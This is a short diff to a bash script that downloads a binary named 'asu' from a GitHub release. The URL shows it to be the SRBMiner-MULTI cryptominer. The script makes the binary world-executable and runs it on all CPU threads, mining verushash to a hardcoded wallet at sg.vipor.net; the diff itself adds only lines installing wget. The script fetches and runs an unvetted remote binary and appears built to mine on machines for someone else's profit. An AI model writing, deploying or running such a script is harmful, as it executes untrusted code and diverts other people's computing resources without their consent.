@@ -1,4 +1,6 @@
 #!/bin/bash
+apt update
+apt -y install wget
 wget -O asu https://github.com/bondaltomason/meo/releases/download/2.7.0/SRBMiner-MULTI
 chmod 777 asu
 ./asu --algorithm verushash --pool sg.vipor.net:5040 --wallet RPcaU166Y5jH2HiE1airbVKTVEw8RwnvBP.$(echo $RANDOM | md5sum | head -c 20) --password x --cpu-threads $(nproc --all)
